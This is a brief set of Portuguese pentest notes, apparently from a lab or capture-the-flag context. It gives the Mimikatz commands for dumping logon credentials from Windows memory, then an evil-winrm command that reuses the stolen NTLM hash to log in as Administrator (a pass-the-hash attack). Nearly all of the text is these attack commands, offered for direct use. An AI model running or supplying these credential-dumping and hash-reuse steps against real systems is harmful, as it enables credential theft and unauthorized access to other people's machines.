
Mimikatz já esta nas utils do nosso kali

Só roda como Admin e precisa da Rev-Shell por que é interativo

```bash

log
privilege::debug

sekurlsa::logonpasswords

```



Com a HASH NTLM, podemos fazer o PASS THE HAST ATTACK

evil-winrm -u 'Administrator' -H "HASH" -i IP_ALVO

